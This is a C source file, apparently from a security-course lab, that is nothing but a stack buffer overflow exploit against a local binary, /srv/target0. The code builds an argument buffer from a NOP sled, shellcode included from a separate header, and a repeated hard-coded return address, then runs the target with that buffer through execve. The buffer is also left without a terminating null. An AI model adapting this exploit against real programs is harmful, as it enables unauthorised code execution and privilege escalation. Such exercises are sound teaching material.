#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target0"

const int OFFSET = 408;
const int NOP_COUNT = 200;
const int RETURN_ADDRESS_COUNT = 52;
const char* RETURN_ADDRESS = "\x3c\xd3\xff\xff";  // 0xffffd33c

int main(void)
{
  char *args[3];
  char *env[1];

  // Create the exploit string
  char buf[OFFSET];
  memset(buf, 0, sizeof(buf));

  // Add the NOP sled
  memset(buf, '\x90', NOP_COUNT);

  // Add the shellcode
  memcpy(buf + NOP_COUNT, shellcode, strlen(shellcode));

  // Add the return addresses
  for (int i = NOP_COUNT + strlen(shellcode); i < OFFSET; i += 4) {
    memcpy(buf + i, RETURN_ADDRESS, 4);
  }

  // Set up the arguments for execve
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  // Execute the target program with the exploit string
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}